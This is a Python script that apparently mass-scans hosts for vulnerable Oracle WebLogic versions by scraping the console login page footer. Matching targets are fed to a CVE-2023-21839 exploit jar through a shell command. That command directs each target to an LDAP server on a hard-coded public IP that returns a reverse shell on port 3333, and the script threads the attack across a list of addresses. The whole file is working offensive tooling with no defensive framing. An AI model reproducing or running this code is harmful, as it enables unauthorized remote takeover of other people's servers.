import requests
from concurrent.futures import ThreadPoolExecutor
import os
import urllib3
import threading
from pathlib import Path
import re
from pkg_resources import parse_version
import time
import subprocess
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',

}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'


def exploit(ip_, index):
    try:
        url = ip_+'/console/login/LoginForm.jsp'
        # url = ip_+''
        # print(index,url)
        versions=['12.2.1.2.0','12.2.1.1.0','12.2.1.3.0','12.2.1.0.0','12.2.1.4.0','14.1.1.0.0','12.1.2.0.0','12.1.3.0.0','10.3.6.0']
        res = requests.get(url, headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        
        # if res.status_code!=200:
            # return
        # pattern='<H4>(.*?) Not Found</H4>'
        pattern='<p id="footerVersion">(.*?)</p>'
        match = re.findall(pattern, res.text)
        version=match[0].split(' ')[-1]
        if version in versions:
            addr=ip_.split('//')[-1]
            os.chdir(r'D:\BaiduNetdiskDownload\Tools\漏洞利用\Weblogic')
            # command=f'java -jar Weblogic-CVE-2023-21839.jar {addr} ldap://39.101.76.53:1389/Basic/ReverseShell/39.101.76.53/3333'
            command=f'java -jar Weblogic-CVE-2023-21839.jar {addr} ldap://13.231.45.178:1389/Basic/ReverseShell/13.231.45.178/3333'
            # res=os.popen(command)
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(1.2)
            print('vulnable')
        # print(version)
        # print(index,url)
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

# url=''
# exploit(url,1)


threads = []
# with open(r'D:\Downloads\tmp\weblogic.txt', 'r') as file:
with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 265
        end = start+100

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 25
# print(urls)

test = 'mt'


if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()